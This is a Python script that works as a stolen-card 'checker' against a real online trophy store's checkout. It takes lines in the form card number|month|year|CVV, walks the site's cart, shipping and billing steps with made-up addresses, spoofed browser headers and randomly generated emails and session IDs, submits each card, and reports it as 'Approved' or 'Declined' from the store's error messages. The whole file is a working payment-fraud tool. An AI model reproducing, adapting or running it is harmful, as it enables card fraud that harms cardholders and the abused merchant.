import requests, random
from faker import Faker
from datetime import datetime
fake = Faker()

def email():
    dominios = ['hotmail.com', 'gmail.com', 'outlook.com', 'yahoo.com']
    nombre_usuario = fake.user_name().replace(" ", "").replace(".", "").replace("-", "").lower()
    dominio = random.choice(dominios)
    correo = f"{nombre_usuario}@{dominio}"
    return correo

    
def sp():
    asp = fake.password(
        length=24,
        special_chars=False,
        digits=True,
        upper_case=False,
        lower_case=True
    )
    return asp

def main1(si):
    sez = requests.Session()
    card = si
    num, mes, ano, cvv = card.strip().split("|")
    if len(mes)== 1:
    	mes = mes
    else:
    	mes = mes[1]
    if len(ano) == 2:
    	ano = f"20{ano}"
    asp = sp()

    url = "https://www.awardsco.com/ajax/store/ajax.aspx"
    cookies = {
        "ASP.NET_SessionId": asp,
    }

    headers = {
        "Host": "www.awardsco.com","Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/javascript, */*; q=0.01", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1", "Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.6","Origin": "https://www.awardsco.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty","Referer": "https://www.awardsco.com/5-shooting-star-resin-basketball-trophy/rt1230bkt/",
    }
    data = """F=AddToCart&ItemId=861273&OrderItemId=0&Logo=&Qty=1&Recipient=Myself&SpecificRecipient=&ValueId=516&IsPersonalization=false&RedirectPersonalization=true&RedirectPersonalizationReview=false&RedirectRegistration=false&RedirectShoppingCart=false&RedirectToItemDetails=false"""
    res = sez.post(url, headers=headers, cookies=cookies, data=data)
    asp = res.cookies.get("ASP.NET_SessionId")
    url = "https://www.awardsco.com/ajax/store/checkout.aspx"
    cookies = {
        "ASP.NET_SessionId": asp,
    }
    headers = {
        "Host": "www.awardsco.com","Connection": "keep-alive","sec-ch-ua-platform": "\"Android\"", "X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "Accept": "application/json, text/javascript, */*; q=0.01","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1", "Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.6","Origin": "https://www.awardsco.com", "Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.awardsco.com/checkout/",
    }
    data = """F=GetInitialShippingData"""
    res = sez.post(url, headers=headers, cookies=cookies, data=data)
    rec_id = res.json()["Addresses"][0]["RecipientId"]    
    url = "https://www.awardsco.com/ajax/store/checkout.aspx"
    cookies = {
        "ASP.NET_SessionId": asp,
    }
    headers = {
        "Host": "www.awardsco.com","Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"","X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "Accept": "application/json, text/javascript, */*; q=0.01", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1","Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.6","Origin": "https://www.awardsco.com", "Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://www.awardsco.com/checkout/",
    }
    data = f"""F=GetShippingCosts&RecipientId={rec_id}&Country=US"""
    res = sez.post(url, headers=headers, cookies=cookies, data=data)
    
    url = "https://www.awardsco.com/ajax/store/checkout.aspx"
    cookies = {
        "ASP.NET_SessionId": asp,
    }
    headers = {
        "Host": "www.awardsco.com","Connection": "keep-alive","sec-ch-ua-platform": "\"Android\"", "X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "Accept": "application/json, text/javascript, */*; q=0.01","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "sec-ch-ua-mobile": "?1", "Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.6", "Origin": "https://www.awardsco.com", "Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty","Referer": "https://www.awardsco.com/checkout/",
    }
    data = f"""F=GetShippingCosts&RecipientId={rec_id}&State=NY&Country=US&Zip=10010"""
    res = sez.post(url, headers=headers, cookies=cookies, data=data)
    date= res.json()['ShippingOptions'][0]['DeliveryDay']
    date = datetime.strptime(str(date), "%A, %B %d, %Y").strftime("%a+%b+%d+%Y+00%%3A00%%3A00+GMT-0600+(hora+est%C3%A1ndar+central)")

    url = "https://www.awardsco.com/ajax/store/checkout.aspx"
    cookies = {
        "ASP.NET_SessionId": asp,
    }
    headers = {
        "Host": "www.awardsco.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Windows\"","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Windows 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/javascript, */*; q=0.01","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1","Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.6", "Origin": "https://www.awardsco.com","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://www.awardsco.com/checkout/",
    }
    data = f"""F=SubmitShipping&RecipientId={rec_id}&ShippingMethodId=ShippingMethodId_0_1&TaxNo=&IsTaxExempt=0&RequestedShipDate={date}&AddressId=&FirstName=Carlos&LastName=Salas&Company=Gribee9282&Address1=Grovee+823&Address2=8273&City=New+York&State=NY&Region=&Country=US&Zip=10010&Phone=7521886488&EveningPhone=4557613827&IsSameAddress=true"""
    res = sez.post(url, headers=headers, cookies=cookies, data=data)

    url = "https://www.awardsco.com/ajax/store/checkout.aspx"
    cookies = {
        "ASP.NET_SessionId": asp,
    }
    headers = {
        "Host": "www.awardsco.com","Connection": "keep-alive","sec-ch-ua-platform": "\"Android\"","X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/javascript, */*; q=0.01", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "sec-ch-ua-mobile": "?1", "Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.6","Origin": "https://www.awardsco.com","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.awardsco.com/checkout/",
    }
    data = f"""F=SubmitBilling&BillingAddressId=&FirstName=Carlos&LastName=Salas&Company=Gribee9282&Address1=Grovee+823&Address2=8273&City=New+York&Region=&State=NY&Country=&Zip=10010&Phone=7521886488&EveningPhone=4557613827&Email=slaamanca%40gmail.com&EmailConfirm=slaamanca%40gmail.com"""
    res = sez.post(url, headers=headers, cookies=cookies, data=data)

    url = "https://www.awardsco.com/ajax/store/checkout.aspx"
    cookies = {
        "ASP.NET_SessionId": asp,
    }
    headers = {
        "Host": "www.awardsco.com", "Connection": "keep-alive","sec-ch-ua-platform": "\"Windows\"","X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Windows 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/javascript, */*; q=0.01", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1","Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.6", "Origin": "https://www.awardsco.com", "Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.awardsco.com/checkout/",
    }
    data = f"""F=SubmitReview&PaymentType=CC&CardType=2&CardNumber={num}&ExpirationMonth={mes}&ExpirationYear={ano}&CVV={cvv}&IsTaxExempt=0&TaxExemptNumber=&CreateAccount=false&ReceiveNewsletter=false&Newsletters=3&Username={email()}&NewsletterHTML=true&NewsletterText=false&Password=&ConfirmPassword=&Comments="""
    res = sez.post(url, headers=headers, cookies=cookies, data=data)
    if 'Your order could not be processed. CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in res.text:
    	return[si.strip(), 'Approved', 'Your order could not be processed. CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.']
    if '"Success":false' in res.text:
    	return [si.strip(), "Declined", res.json().get("Error")]
    else:
    	return [si.strip(), "Approved", res.json()]
    	